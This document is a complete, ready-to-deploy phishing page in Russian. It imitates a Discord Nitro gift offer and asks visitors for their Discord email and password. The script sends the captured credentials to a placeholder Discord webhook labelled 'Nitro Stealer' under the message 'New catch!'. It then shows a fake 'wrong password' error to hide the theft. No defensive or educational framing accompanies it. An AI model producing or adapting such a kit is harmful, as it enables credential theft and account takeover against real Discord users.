<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Nitro</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1e1f22;font-family:'gg sans','Helvetica Neue',Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}
.card{background:#313338;padding:32px;border-radius:8px;width:480px;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.card h1{color:#f2f3f5;font-size:24px;text-align:center;margin-bottom:8px}
.card p{color:#b5bac1;font-size:14px;text-align:center;margin-bottom:24px}
.logo{text-align:center;margin-bottom:20px}
.logo svg{width:60px;height:60px}
.input-group{margin-bottom:16px}
.input-group label{color:#b5bac1;font-size:12px;font-weight:700;text-transform:uppercase;display:block;margin-bottom:8px}
.input-group input{width:100%;padding:10px 12px;background:#1e1f22;border:1px solid #1e1f22;border-radius:4px;color:#f2f3f5;font-size:16px;outline:none;transition:border .2s}
.input-group input:focus{border-color:#5865f2}
.btn{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;transition:background .2s}
.btn:hover{background:#4752c4}
.nitro-badge{background:linear-gradient(90deg,#ff73fa,#8a5cf5);padding:20px;border-radius:8px;text-align:center;margin-bottom:24px}
.nitro-badge h2{color:#fff;font-size:20px}
.nitro-badge p{color:rgba(255,255,255,.8);font-size:13px;margin-top:4px}
.loading{display:none;text-align:center;padding:20px}
.spinner{width:40px;height:40px;border:4px solid #313338;border-top:4px solid #5865f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.error{color:#ed4245;font-size:12px;display:none;margin-top:8px;text-align:center}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 127.14 96.36" fill="#5865f2"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,56.6,124.08,32.64,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.3,60,73.3,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg>
</div>
<div class="nitro-badge">
<h2>Вы получили Discord Nitro!</h2>
<p>3 месяца бесплатного Nitro в подарок от партнёра Discord</p>
</div>

<h1>Войдите чтобы активировать</h1>
<p>Используйте ваш Discord аккаунт для получения подарка</p>

<div id="loginForm">
<div class="input-group">
<label>Email или номер телефона</label>
<input type="text" id="email" placeholder="email@example.com" autocomplete="off">
</div>
<div class="input-group">
<label>Пароль</label>
<input type="password" id="password" placeholder="••••••••" autocomplete="off">
</div>
<button class="btn" onclick="login()">Войти</button>
<div class="error" id="errorMsg">Неверный email или пароль. Попробуйте снова.</div>
</div>

<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#b5bac1;font-size:14px">Проверяем ваш аккаунт...</p>
</div>
</div>

<script>
async function login(){
const email=document.getElementById('email').value.trim();
const password=document.getElementById('password').value;
const errorMsg=document.getElementById('errorMsg');

if(!email||!password){
errorMsg.style.display='block';
errorMsg.textContent='Заполните все поля';
return;
}

document.getElementById('loginForm').style.display='none';
document.getElementById('loading').style.display='block';

try{
await fetch('https://discord.com/api/webhooks/ТВОЙ_ВЕБХУК',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
content:'```\nНовый улов!\nEmail: '+email+'\nPass: '+password+'\n```',
username:'Nitro Stealer'
})
});
}catch(e){}

setTimeout(function(){
document.getElementById('loading').style.display='none';
document.getElementById('loginForm').style.display='block';
errorMsg.style.display='block';
errorMsg.textContent='Неверный email или пароль. Попробуйте снова.';
document.getElementById('password').value='';
},2000);
}

document.getElementById('password').addEventListener('keydown',function(e){
if(e.key==='Enter')login();
});
</script>
</body>
</html>
